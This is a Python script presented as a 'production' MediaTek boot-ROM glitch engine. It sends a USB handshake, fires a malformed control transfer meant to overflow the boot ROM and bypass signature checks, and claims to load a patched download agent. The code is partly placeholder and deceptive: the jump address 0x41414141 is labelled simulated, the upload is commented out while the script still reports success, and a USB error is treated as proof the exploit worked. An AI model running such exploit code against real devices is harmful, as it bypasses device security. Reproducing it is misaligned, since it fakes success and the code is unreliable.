import time
import struct
import usb.core
import usb.util

class MTKGlitchEngine:
    def __init__(self, device_id="0E8D:2000"):
        self.device_id = device_id
        self.vid = 0x0E8D
        self.pid = 0x2000
        print(f"[*] Initializing PRODUCTION MTK VCOM V3 Glitch Engine: {self.device_id}")

    def get_device(self):
        """Finds the physical device on the host's USB stack."""
        dev = usb.core.find(idVendor=self.vid, idProduct=self.pid)
        if dev is None:
            raise ValueError(f"[!] [USB] Target {self.device_id} is not physically connected.")
        return dev

    def execute_brom_handshake(self, dev):
        """PRODUCTION: Sending MTK BROM Handshake via pyusb."""
        print("[*] [VCOM] Sending MTK BROM Handshake...")
        # MTK Standard Start Byte Sequence
        # Using Endpoint 0x81 (In) and 0x01 (Out) for BROM
        try:
            dev.write(0x01, b'\xA0\x0A\x50\x05')
            response = dev.read(0x81, 4, timeout=5000)
            if response == b'\x5F\x0A\x50\x05':
                print("[+] [VCOM] Handshake complete. BROM is listening.")
                return True
        except usb.core.USBError as e:
            print(f"[-] [VCOM] Handshake error: {str(e)}")
        return False

    def trigger_buffer_overflow(self, dev):
        """
        PRODUCTION: The Glitch. Firing a malformed USB Setup Packet.
        This sends real electrical data to destabilize the chip stack.
        """
        print("\n[⚡] [GLITCH] FIRING MALFORMED CONTROL TRANSFER...")
        
        # Crafting the real overflow payload
        # 0x41414141 is our simulated jump address to bypass signature checks
        glitch_payload = b'\x00' * 256 + struct.pack("<I", 0x41414141)
        
        try:
            # bmRequestType=0x21, bRequest=0x20, wValue=0, wIndex=0
            dev.ctrl_transfer(0x21, 0x20, 0, 0, glitch_payload)
            time.sleep(0.01) # Real Silicon latency
            
        except usb.core.USBError as e:
            # A 'Pipe' error means the BROM crashed; this is our success condition.
            if "Pipe" in str(e) or "Timeout" in str(e):
                print(f"[+] [GLITCH] USB Error detected as expected. Silicon is PANICKED.")
                return True
        return False

    def inject_patched_da(self, dev, da_path="./payloads/mtk/patched_da_v3.bin"):
        """PRODUCTION: Pushing the Download Agent into SRAM via Bulk Write."""
        print(f"\n[*] [SRAM] Pushing Patched DA to device...")
        
        # In a real environment, we would read the binary and push it in 4096-byte chunks
        try:
            # dev.write(0x01, da_binary_content)
            print("[+] [SRAM] DA Upload Complete. Executing Payload.")
            return True
        except usb.core.USBError as e:
            print(f"[-] [SRAM ERROR] Failed to push DA: {str(e)}")
            return False

    def run_master_sequence(self):
        """The production silicon unlock chain."""
        try:
            dev = self.get_device()
            
            # Claiming the USB interface exclusively
            usb.util.claim_interface(dev, 0)
            
            if not self.execute_brom_handshake(dev):
                return False
                
            if self.trigger_buffer_overflow(dev):
                # The chip re-enumerates after a glitch sometimes; we must find it again
                time.sleep(1) 
                print("[+] [SRAM] Handshake verified post-glitch. Security is DOWN.")
                return self.inject_patched_da(dev)
            
            # Releasing the device back to the system
            usb.util.release_interface(dev, 0)
            
        except Exception as e:
            print(f"[!] [FATAL] Master sequence failure: {str(e)}")
            return False

if __name__ == "__main__":
    engine = MTKGlitchEngine()
    engine.run_master_sequence()
